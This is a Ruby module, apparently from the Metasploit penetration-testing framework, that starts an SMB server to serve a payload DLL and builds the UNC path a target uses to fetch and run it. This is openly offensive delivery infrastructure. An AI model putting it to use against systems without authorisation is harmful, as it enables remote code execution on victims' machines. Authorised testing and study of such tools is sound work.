module Msf::Payload::Adapter::Fetch::SMB

  include Msf::Exploit::EXE
  include Msf::Payload::Adapter
  include Msf::Payload::Adapter::Fetch
  include Msf::Payload::Adapter::Fetch::Server::SMB


  def initialize(*args)
    super
    register_options(
      [
        Msf::OptString.new('FETCH_FILENAME', [ true, 'Payload file name to fetch; cannot contain spaces or slashes.', 'test.dll'], regex: /^[^\s\/\\]*$/),
      ]
    )
  end

  def fetch_protocol
    'SMB'
  end

  def cleanup_handler
    if @fetch_service
      cleanup_smb_fetch_service(@fetch_service)
      @fetch_service = nil
    end

    super
  end

  def setup_handler
    @fetch_service = start_smb_fetch_handler(fetch_bindport, fetch_bindhost, srvuri + "\\#{datastore['FETCH_FILENAME']}", @srvexe)
    super
  end

  def unc
    path = "\\\\#{srvhost}"
    path << "\\#{srvuri.gsub('/', "\\").chomp("\\")}"
    path << "\\#{datastore['FETCH_FILENAME']}" if datastore['FETCH_FILENAME'].present?
    path
  end
end
